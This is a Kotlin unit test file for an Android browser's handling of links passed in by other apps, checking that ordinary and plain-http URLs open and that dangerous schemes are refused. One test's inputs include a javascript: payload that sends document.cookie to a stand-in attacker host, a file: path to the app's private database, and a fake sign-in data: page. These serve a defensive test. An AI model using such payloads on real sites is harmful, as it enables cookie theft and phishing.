/*
 * Copyright (c) 2026 NoMercy Labs
 * SPDX-License-Identifier: MIT
 */

package com.nomercylabs.arrowz.browser

import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Test

class ExternalLinkTest {

    @Test
    fun anOrdinaryLinkIsOpenedUnchanged() {
        assertEquals(
            "https://example.org/watch?v=1",
            ExternalLink.resolve("https://example.org/watch?v=1"),
        )
    }

    // http is not "insecure enough to refuse" here: a router admin page, a NAS
    // and a printer are all http, and refusing them would make the browser
    // useless for the long tail this app exists to reach.
    @Test
    fun plainHttpIsOpened() {
        assertEquals("http://192.168.2.120:5000/", ExternalLink.resolve("http://192.168.2.120:5000/"))
    }

    @Test
    fun theSchemeIsMatchedWithoutRegardToCase() {
        assertEquals("HTTPS://example.org/", ExternalLink.resolve("HTTPS://example.org/"))
    }

    // The four an external caller must never get to run. Typed into our own
    // address bar these are already refused; arriving by intent there is no
    // person to have made the decision at all.
    @Test
    fun aSchemeAnotherAppMustNotReachIsRefused() {
        listOf(
            "javascript:fetch('https://evil.example/'+document.cookie)",
            "file:///data/data/com.nomercylabs.arrowz/databases/browser.db",
            "content://com.android.providers.media.documents/document/image%3A1",
            "data:text/html,<h1>Arrowz Browser sign in</h1>",
        ).forEach { hostile ->
            assertNull(hostile, ExternalLink.resolve(hostile))
        }
    }

    // `intent:` is the scheme that launders every other scheme through the
    // system, so it is refused whatever it claims to wrap.
    @Test
    fun anIntentUrlIsRefused() {
        assertNull(ExternalLink.resolve("intent://example.org#Intent;scheme=https;end"))
    }

    @Test
    fun aSchemeWithNoPageBehindItIsRefused() {
        listOf("http:", "https://", "https:///path", "http://").forEach { empty ->
            assertNull(empty, ExternalLink.resolve(empty))
        }
    }

    // A launcher can hand over a VIEW with no data at all, and the browser must
    // open its own home screen rather than crash or load an empty page.
    @Test
    fun nothingAtAllIsRefusedRatherThanGuessedAt() {
        assertNull(ExternalLink.resolve(null))
        assertNull(ExternalLink.resolve(""))
        assertNull(ExternalLink.resolve("   "))
    }

    // Unlike the address bar, a bare hostname is not repaired. Typed text comes
    // from a person and deserves a guess; an intent comes from software that
    // could have sent a real URL and did not.
    @Test
    fun aBareHostnameIsNotRepairedIntoAUrl() {
        assertNull(ExternalLink.resolve("example.org"))
    }

    @Test
    fun surroundingWhitespaceDoesNotHideTheScheme() {
        assertEquals("https://example.org/", ExternalLink.resolve("  https://example.org/  "))
        assertNull(ExternalLink.resolve("  javascript:alert(1)  "))
    }
}
